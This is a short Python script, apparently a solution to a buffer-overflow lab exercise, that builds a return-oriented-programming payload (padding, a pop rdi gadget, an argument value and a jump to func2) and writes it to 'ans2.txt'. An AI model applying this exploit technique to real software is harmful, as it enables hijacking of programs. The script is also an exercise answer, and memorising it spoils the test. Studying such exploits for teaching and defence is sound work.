#!/usr/bin/env python3
import struct

# 1. 填充 dest 和 saved rbp 的 16 字节
#    dest 在 rbp-0x8，拷贝56字节，前8字节填充dest，接着8字节覆盖保存的rbp
padding = b'A' * 16

# 2. ROP 链设置
pop_rdi = 0x4012c7    # pop rdi; ret 的地址（从反汇编看）
arg = 0x3f8           # 1016 的十六进制
func2_addr = 0x401216 # func2 函数的入口地址

# 3. 构造 payload
payload = padding
payload += struct.pack('<Q', pop_rdi)   # 小端序 64 位地址
payload += struct.pack('<Q', arg)       # pop rdi 时会弹出这个值到 rdi
payload += struct.pack('<Q', func2_addr) # 然后返回到 func2

# 4. 检查长度
print(f"Payload length: {len(payload)} bytes")
print(f"Maximum allowed by memcpy: 56 bytes")
if len(payload) > 56:
    print("ERROR: Payload too long!")
    exit(1)

# 5. 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans2.txt")

# 6. 显示 payload 内容（可选）
print("\nPayload hex dump:")
for i in range(0, len(payload), 8):
    chunk = payload[i:i+8]
    hex_str = ' '.join(f'{b:02x}' for b in chunk)
    offset = i
    if offset == 0:
        print(f"Offset {offset:2d}: {hex_str}  # 前8字节填充 dest")
    elif offset == 8:
        print(f"Offset {offset:2d}: {hex_str}  # 覆盖 saved rbp")
    elif offset == 16:
        print(f"Offset {offset:2d}: {hex_str}  # 返回地址 -> pop rdi gadget (0x4012c7)")
    elif offset == 24:
        print(f"Offset {offset:2d}: {hex_str}  # 参数值 0x3f8")
    elif offset == 32:
        print(f"Offset {offset:2d}: {hex_str}  # 返回到 func2 (0x401216)")
